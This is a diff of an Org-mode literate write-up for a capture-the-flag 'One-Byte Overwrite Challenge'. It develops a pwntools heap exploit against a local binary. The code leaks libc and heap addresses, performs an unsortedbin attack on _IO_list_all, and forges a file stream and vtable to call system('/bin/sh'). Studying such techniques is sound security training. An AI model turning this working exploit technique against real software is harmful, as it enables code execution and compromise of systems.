@@ -1,63 +1,190 @@
-#+PROPERTY: header-args :tangle exploit.py :tangle-mode (identity #o744)
+#+PROPERTY: header-args :tangle xpl.py :tangle-mode (identity #o744)
 
 #+TITLE: One-Byte Overwrite Challenge
 
 * Table of Contents                                                 :TOC:
 - [[#preamble][Preamble]]
+- [[#the-vulnerability][The Vulnerability]]
 - [[#the-exploit][The Exploit]]
+  - [[#leak-the-unsorted_bin-address][Leak the ~unsorted_bin~-address]]
+  - [[#leak-a-heap-address][Leak a heap address]]
+  - [[#restoring-heap-state-in-order-to-leverage-an-unsorted_bin-attack][Restoring heap state in order to leverage an ~unsorted_bin~-attack]]
+  - [[#the-actual-file-stream-exploitation][The actual File-Stream Exploitation]]
+  - [[#fire-it-up][Fire it up]]
 
 * Preamble
 
 #+BEGIN_SRC python 
-  #!/usr/bin/python3
-  from pwn import *
+    #!/usr/bin/python3
+    from pwn import *
 
-  elf = context.binary = ELF("one_byte")
-  libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again
+    elf = context.binary = ELF("one_byte")
+    libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again
 
-  gs = '''
-  continue
-  '''
-  def start():
-      if args.GDB:
-          return gdb.debug(elf.path, gdbscript=gs)
-      else:
-          return process(elf.path)
+    gs = '''
+    set breakpoint pending on
+    break _IO_flush_all_lockp
+    enable breakpoints once 1
+    continue
+    '''
+    def start():
+        if args.GDB:
+            return gdb.debug(elf.path, gdbscript=gs)
+        else:
+            return process(elf.path)
 
-  # Index of allocated chunks.
-  index = 0
+    # Index of allocated chunks.
+    index = 0
 
-  # Select the "malloc" option.
-  # Returns chunk index.
-  def malloc():
-      global index
-      io.sendthen(b"> ", b"1")
-      index += 1
-      return index - 1
+    # Select the "malloc" option.
+    # Returns chunk index.
+    def malloc():
+        global index
+        io.sendthen(b"> ", b"1")
+        index += 1
+        return index - 1
 
-  # Select the "free" option; send index.
-  def free(index):
-      io.send(b"2")
-      io.sendafter(b"index: ", f"{index}".encode())
-      io.recvuntil(b"> ")
+    # Select the "free" option; send index.
+    def free(index):
+        io.send(b"2")
+        io.sendafter(b"index: ", f"{index}".encode())
+        io.recvuntil(b"> ")
 
-  # Select the "edit" option; send index & data.
-  def edit(index, data):
-      io.send(b"3")
-      io.sendafter(b"index: ", f"{index}".encode())
-      io.sendafter(b"data: ", data)
-      io.recvuntil(b"> ")
+    # Select the "edit" option; send index & data.
+    def edit(index, data):
+        io.send(b"3")
+        io.sendafter(b"index: ", f"{index}".encode())
+        io.sendafter(b"data: ", data)
+        io.recvuntil(b"> ")
 
-  # Select the "read" option; read 0x58 bytes.
-  def read(index):
-      io.send(b"4")
-      io.sendafter(b"index: ", f"{index}".encode())
-      r = io.recv(0x58)
-      io.recvuntil(b"> ")
-      return r
+    # Select the "read" option; read 0x58 bytes.
+    def read(index):
+        io.send(b"4")
+        io.sendafter(b"index: ", f"{index}".encode())
+        r = io.recv(0x58)
+        io.recvuntil(b"> ")
+        return r
 
-  io = start()
-  io.recvuntil(b"> ")
-  io.timeout = 0.1
+    io = start()
+    io.recvuntil(b"> ")
+    io.timeout = 0.1
 #+END_SRC
+* The Vulnerability
+The vulnerability here lies in the fact, that we just are able to overwrite one byte of the succeeding chunk,
+i.e. the ~size~-field of the succeeding chunk.
+
 * The Exploit
+** Leak the ~unsorted_bin~-address
+*** Preparation
+In order to leak the address of the unsorted-bin, we need to prepare an already allocated chunk being overlapped
+by an already freed chunk in the ~unsorted_bin~. Therefore we will request 4 chunks:
+- The first chunk is just a 0x60-sized small chunk
+- The second one is the one with its size being extended via the aforementioned overflow-bug
+  (i.e. extended to overlap the already allocated 3rn chunk)
+- The 3rd chunk is the one that will end up into the ~unsorted_bin~ as well as still being marked
+  as allocated on the heap
+- The 4th ist just there for preventing a future consolidation of the 3rd chunk with the ~top_chunk~
+
+  #+begin_src python :tangle yes
+    # Request 4 chunks.
+    chunk_A = malloc()
+    chunk_B = malloc()
+    chunk_C = malloc()
+    chunk_D = malloc() # Guard against consolidation with top chunk.
+    chunk_E = malloc()
+
+    # Overflow from chunk A into chunk B's size field.
+    edit(chunk_A, b"Y"*88 + p8(0xc1))
+
+    # Chunk B is now a 0xc0 chunk, the sum of 2 0x60 chunks.
+
+    # Free chunk B into the unsortedbin.
+    free(chunk_B)
+    #+end_src
+*** Writing ~unsorted_bin~-metadata into chunk C
+Now requesting a 0x60-sized chunk, i.e. ~chunk_B~, will triggering the so-called =remaindering=-procedure.
+This procedure will happen, cause we just a so called last remainder into the unsorted bin. Otherwise it would
+occassionally happen, if we had a chunk being sorted into its appropriate small- or largebin, which is not the case
+here, since it's the last remainder.
+This will lead to ~unsorted_bin~-metadata being written into ~chunk_C~. ~chunk_C~ is still allocated.
+So this step is necessary due to the fact, that we can only read from chunks still being allocated.
+
+#+begin_src python :tangle yes
+  # This request remainders chunk B, writing unsortedbin metadata into chunk C.
+  chunk_B = malloc()
+#+end_src
+
+The unsortedbin address will be at offset 0x58 from ~main_arena~'s address
+#+begin_src python :tangle yes
+  # Leak the main arena's unsortedbin address via chunk C.
+  libc.address = u64(read(chunk_C)[:8]) - (libc.sym.main_arena + 0x58)
+  log.info(f"libc @ 0x{libc.address:02x}")
+#+end_src
+** Leak a heap address
+
+In order to leak a heap address, we will restore the state with just 4 0x60-sized chunks being
+allocated on the heap:
+
+#+begin_src python :tangle yes
+  # Request the remainder that overlaps chunk C.
+  chunk_C2 = malloc()
+#+end_src
+
+Freeing ~chunk_A~, then ~chunk_C2~ will end up in fastbin metadata being written into chunk C.
+#+begin_src python :tangle yes
+  # Free chunk A then C2, writing fastbin metadata into chunk C.
+  free(chunk_A)
+  free(chunk_C2)
+#+end_src
+
+Now heap address is being ready wo be read from ~chunk_A~
+
+#+begin_src python :tangle yes
+# Leak a heap address via chunk C.
+heap = u64(read(chunk_C)[:8])
+log.info(f"heap @ 0x{heap:02x}")
+#+end_src
+** Restoring heap state in order to leverage an ~unsorted_bin~-attack
+
+#+begin_src python :tangle yes
+  # =-=-=- PREPARE TO TAMPER WITH UNSORTEDBIN METADATA -=-=-=
+
+  # Return chunk C2 from the fastbins, followed by chunk A.
+  chunk_C2 = malloc()
+  chunk_A = malloc()
+
+  # Once again leverage an overflow from chunk A  into chunk B's size field.
+  edit(chunk_A, b"Y"*88 + p8(0xc1))
+
+  # Free chunk B into the unsortedbin again.
+  free(chunk_B)
+
+  # Remainder chunk B again.
+  chunk_B = malloc()
+
+  # Now an unsorted chunk overlaps chunk C, in preparation for an unsortedbin attack.
+#+end_src
+
+Now an unsorted chunk should overlap chunk C, in preparation for an unsortedbin attack.
+
+** The actual File-Stream Exploitation
+
+#+BEGIN_SRC python :tangle yes
+  # =-=-=- PREPARE UNSORTEDBIN ATTACK & FAKE FILE STREAM -=-=-=
+
+  # Write the string "/bin/sh" into the file stream's _flags field.
+  edit(chunk_B, p64(0)*10 + b"/bin/sh\0")
+
+  # Overwrite the unsorted chunk's bk & ensure _IO_write_ptr > _IO_write_base.
+  # The _mode field is already null thanks to calloc().
+  edit(chunk_C, p64(0) + p64(libc.sym._IO_list_all - 16) + p64(1) + p64(2))
+
+  # Forge a vtable pointer and vtable, in this case the vtable overlaps the
+  # _unused2 field of the file stream to save space.
+  edit(chunk_E, p64(libc.sym.system) + p64(heap + 0x178))
+#+END_SRC
+
+** Fire it up
+#+begin_src python :tangle yes
+io.interactive()
+#+end_src
